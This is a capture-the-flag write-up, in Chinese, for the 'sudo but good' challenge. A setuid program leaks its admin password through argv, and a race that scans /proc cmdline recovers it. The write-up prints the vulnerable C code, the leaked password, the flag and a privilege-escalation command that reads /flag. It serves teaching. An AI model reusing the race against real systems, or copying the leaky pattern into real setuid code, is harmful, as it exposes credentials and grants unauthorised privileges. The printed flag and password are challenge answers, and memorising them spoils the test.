# sudo but good — WRITEUP

**Flag: `K17{ju$t_d0n't_writ3_bugs_ezpz}`**

> 连接方式（本次实例）：`ssh -p <port> ctf@<host>`，口令为平台发的实例口令
> （handout Dockerfile 里写的是 `hunter2`，线上被改过 —— 口令是平台按实例随机发的。）

## 题面

> sudo is so complicated and has so many bugs. now these people are rewriting it in rust
> like that'll help??? i can do better.

`/app/sudobutgood` 是 `admin` 的 **setuid** 程序（`r-sr-xr-x`），`/home/ctf/sudobutgood` 是指向它的软链。
`/app/sudobutgood_pass`（`-r-------- admin`，25 字节）和 `/flag`（`400 admin`）都只有 admin 能读。
镜像里其他 setuid 位都被 `find / -xdev -perm /4000 -type f -exec chmod a-s {} \;` 清掉了，
只剩这一条提权路径。

## 程序逻辑（`sudobutgood.c`，与二进制逐指令核对过）

```c
void get_hash(const char *input, char *hash_out) {
    pipe(pipefd); fork();
    if (pid == 0) {
        dup2(pipefd[1], STDOUT_FILENO);
        char *args[] = { "/bin/sh", "-c",
                         "printf \"%s\" \"$1\" | /usr/bin/sha256sum",
                         "sh", (char *)input, NULL };
        execve(args[0], args, NULL);          // ← 密码作为 argv 元素暴露
    } else {
        read(pipefd[0], hash_out, 64);        // 只读 64 字节，不循环
        wait(NULL);
    }
}
```

`main` 先读 `/app/sudobutgood_pass` 求哈希，再读我们 stdin 的密码求哈希，
`strncmp(secret_hash, user_hash, 64) == 0` 就 `setresuid(geteuid(),...)` + `system(argv[1])`。

密码文件是 25 字节的随机串（`i_want_to_boil_rustaceans`，24 字符 + `\n`），
**不是弱口令，字典爆破没戏**。

## 漏洞：密码通过 argv 泄漏到 `/proc/<pid>/cmdline`

拿 shell 的人不用 root 也能读 **任意进程的 `/proc/<pid>/cmdline`**，而这里
`get_hash` 把**密码本身**当参数塞给了 `/bin/sh -c ... sh <PASSWORD>`：

```
cat /proc/147/cmdline | tr '\0' ' '
/bin/sh -c printf "%s" "$1" | /usr/bin/sha256sum sh i_want_to_boil_rustaceans
                                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
```

`sh` 进程的存活时间 = 整条 `printf | sha256sum` 管道跑完（约几毫秒，`sha256sum` 还要
fork+exec 动态链接，窗口够大）。所以「扫 `/proc/*/cmdline` + 不停起 sudobutgood」就能撞到。

顺便验证了一下规则：`ssh-agent`（setgid，同样 non-dumpable）的 cmdline 也是可读的，
所以子进程 exec 非 setuid 的 `/bin/sh` 之后并没有把 `dumpable` 锁死。

## 利用

`exploit.sh`（= 实际用的脚本）：先用 python 起一个扫 `/proc/*/cmdline` 的循环，
再用 `/dev/null` 当 stdin 连起 1500 次 `/home/ctf/sudobutgood x`（每次第一发 `get_hash`
都会把密码写进 argv；`/dev/null` 让 fgets 立刻失败退出，跑得飞快，命中率接近 100%）。

拿到密码后：

```bash
echo 'i_want_to_boil_rustaceans' | /home/ctf/sudobutgood 'id; cat /flag'
# uid=100(admin) gid=1000(ctf) groups=1000(ctf),100(users)
# K17{ju$t_d0n't_writ3_bugs_ezpz}
```

## 备注 / 其他死路

- **想直接从 shell 拿 flag：** `/flag` 是 `400 admin admin`，`/app/*` 全是 `admin admin`，
  `/app` 目录 755，ctf 既读不了也删不掉 `sudobutgood_pass`（改不了文件名指向，因为改目录要写权限）。
- **想找别的 setuid：** `find / -perm -4000` 只剩 `/app/sudobutgood`；
  `chage`/`expiry`/`ssh-agent`/`unix_chkpwd` 只是 **setgid**（2755，Dockerfile 的 defang 只清 setuid）。
- **想改密码文件：** `/app` 不可写，`sudo` 未安装。
- 代码里的 `printf "%s" "$1"` 是**双引号**参数展开，命令替换不会被二次求值，
  所以从 stdio 塞 `$(...)` 打不进 shell——真正的泄漏点是 **argv**，不是命令注入。
